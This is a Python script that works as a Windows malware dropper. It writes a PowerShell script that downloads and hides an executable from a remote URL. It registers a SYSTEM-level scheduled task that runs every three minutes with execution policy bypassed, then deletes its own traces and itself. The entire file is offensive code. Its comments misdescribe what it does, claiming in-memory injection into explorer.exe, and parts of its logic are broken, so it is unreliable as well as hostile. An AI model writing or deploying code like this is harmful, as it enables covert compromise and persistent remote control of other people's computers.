import os
import subprocess

# Replace this with the URL of your hosted executable
executable_url = "https://github.com/davidkennedy02/gaslight/blob/main/dist/hmm.exe"

# Step 1: Define the PowerShell command to download and run the executable in memory, injected into explorer.exe
powershell_command = f'''
$URL = "{executable_url}";
$Output = "$env:TEMP\\hmm.exe";
Invoke-WebRequest -Uri $URL -OutFile $Output;
Start-Process -FilePath "C:\\Windows\\explorer.exe" -ArgumentList "/c start $Output" -WindowStyle Hidden;
'''

# Step 2: Save the PowerShell command to a temporary file
temp_ps_path = os.path.join(os.environ["TEMP"], "inject.ps1")
with open(temp_ps_path, "w") as ps_file:
    ps_file.write(powershell_command)

# Step 3: Create a hidden scheduled task to execute the PowerShell script at system startup
task_name = "somethingreallyunique"
create_task_command = f"""
schtasks /create /tn "{task_name}" /tr "powershell.exe -ExecutionPolicy Bypass -File {temp_ps_path}" /sc minute /mo 3 /f /rl highest /ru System
"""

# Execute the scheduled task creation command
subprocess.run(create_task_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# Step 4: Clean up by deleting the PowerShell script and this setup script
if os.path.exists(temp_ps_path):
    os.remove(temp_ps_path)

# Self-delete the setup script
current_script_path = os.path.realpath(__file__)
os.remove(current_script_path)
